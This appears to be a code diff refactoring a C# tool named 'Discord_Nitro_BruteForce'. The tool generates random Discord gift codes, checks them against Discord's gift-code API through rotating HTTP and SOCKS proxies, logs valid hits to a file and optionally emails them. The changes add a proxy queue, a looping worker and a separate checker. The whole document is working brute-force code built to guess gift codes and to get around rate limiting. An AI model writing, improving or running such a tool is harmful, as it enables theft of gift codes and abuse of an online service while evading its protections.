@@ -9,22 +9,21 @@ using System.Windows.Forms;
 using System.Net.Mail;
 using Leaf.xNet;
 using System.ComponentModel;
+using System.CodeDom;
+using System.Collections.Concurrent;
 
 namespace Discord_Nitro_BruteForce
 {
     class Program
     {
         static Random random = new Random();
-        static string goods = "";
-        static int lenGoods = 0;
-        static int ch = 0;
-        static int err = 0;
+        public static int goods = 0;
+        public static int ch = 0;
         static bool work = false;
-        static string[] proxies;
+        static ProxyQueue proxies;
         static int proxyType;
-        static bool verbose = false;
 
-        static bool emailnotification = false;
+        public static bool emailnotification = false;
         static string username;
         static string password;
         static string myemail;
@@ -93,12 +92,8 @@ namespace Discord_Nitro_BruteForce
 
             string proxyPath = dialog.FileName;
 
-            proxies = File.ReadAllLines(proxyPath);
+            proxies = new ProxyQueue(File.ReadAllLines(proxyPath));
             Console.WriteLine($"Loaded {proxies.Length} proxies");
-
-            Console.WriteLine("Use verbose mode? (y/n): ");
-            if (Console.ReadLine().ToLower().Trim() == "y")
-                verbose = true;
 
             Console.Write("Use email notification? (y/n)");
             if (Console.ReadLine().ToLower().Trim() == "y")
@@ -167,99 +162,42 @@ namespace Discord_Nitro_BruteForce
             Console.ReadKey();
         }
 
-
-        static void Worker(object s)
+        static void Worker()
         {
-            Worker("");
-        }
-        static void Worker(string code)
-        {
-            if (!work)
-                return;
-            try
+            string code = GenerateCode();
+            while (work)
             {
-                ProxyClient proxy = getNewProxy();
-
-                if(code == "")
-                    code = GenerateCode();
-                HttpRequest request = new HttpRequest();
-                request.ConnectTimeout = 10000;
-                request.Proxy = proxy;
-
                 try
                 {
-                    HttpResponse response = request.Get($"https://discordapp.com/api/v6/entitlements/gift-codes/{code}");
-                    String res = response.ToString();
-
-                    ch++;
-
-                    Console.ForegroundColor = ConsoleColor.Green;
-                    Console.WriteLine($"[+] {code}");
-                    Console.WriteLine(res);
-                    lenGoods++;
-                    goods += $"{code}\r\n";
-                    try
-                    {
-                        File.WriteAllText("good.txt", goods);
-
-                        if(emailnotification == true)
-                            SendEmail(goods, "Hey! I founded!");
-                    }
-                    catch (FileNotFoundException)
-                    {
-                        FileStream goodsFile = File.Create("good.txt");
-                        goodsFile.Close();
-
-                        File.WriteAllText("good.txt", goods);
-                    }
-
-                    Thread.Sleep(1000);
+                    Checker.Check(code, getNewProxy());
                 }
-                catch (HttpException e)
-                {                   
-                    if (e.Status == HttpExceptionStatus.ConnectFailure || e.HttpStatusCode != HttpStatusCode.NotFound)
-                    {
-                        err++;
-                        if (verbose)
-                        {
-                            Console.ForegroundColor = ConsoleColor.Yellow;
-                            if (e.Status == HttpExceptionStatus.ConnectFailure)
-                                Console.WriteLine($"[ERR] {code}");
-                            else
-                                Console.WriteLine($"[RATELIMIT] {code}");
-                        }
-                            
-                        Worker(code);
-                        return;
-                    }
-                    ch++;
-                    Console.ForegroundColor = ConsoleColor.Red;
-                    Console.WriteLine($"[-] {code}");
+                catch (HttpException)
+                {
+                    continue;
                 }
+                catch(Exception e)
+                {
+                    Console.WriteLine(e);
+                }
+                code = GenerateCode();
             }
-            catch (Exception e) 
-            {
-                Console.WriteLine(e);
-            }
-
-            Worker("");
         }
 
         static ProxyClient getNewProxy()
-        {           
-            string fullP = proxies[random.Next(0, proxies.Length - 1)];//nice method :p
+        {
+            string fullP = proxies.Next();
                 
             switch (proxyType)
-                {
-                    case 1:
-                            return HttpProxyClient.Parse(fullP);
-                    case 2:
-                            return Socks4ProxyClient.Parse(fullP);
-                    case 3:
-                            return Socks5ProxyClient.Parse(fullP);
-                    default:
-                            return HttpProxyClient.Parse(fullP);
-                }
+            {
+                case 1:
+                        return HttpProxyClient.Parse(fullP);
+                case 2:
+                        return Socks4ProxyClient.Parse(fullP);
+                case 3:
+                        return Socks5ProxyClient.Parse(fullP);
+                default:
+                        return HttpProxyClient.Parse(fullP);
+            }
         }
 
         static string GenerateCode()
@@ -282,14 +220,14 @@ namespace Discord_Nitro_BruteForce
                 string text = "idle";
                 if (work)
                 {
-                    text = $"work Checked: {ch}, Hits: {lenGoods}, Errors: {err}";
+                    text = $"work Checked: {ch}, Hits: {goods}";
                 }
 
                 Console.Title = $"DNBF - {text}";
             }
         }
 
-        static void SendEmail(string context, string subject)
+        public static void SendEmail(string context, string subject)
         {
             MailMessage mail = new MailMessage();
             SmtpClient SmtpServer = new SmtpClient(smtpserver);
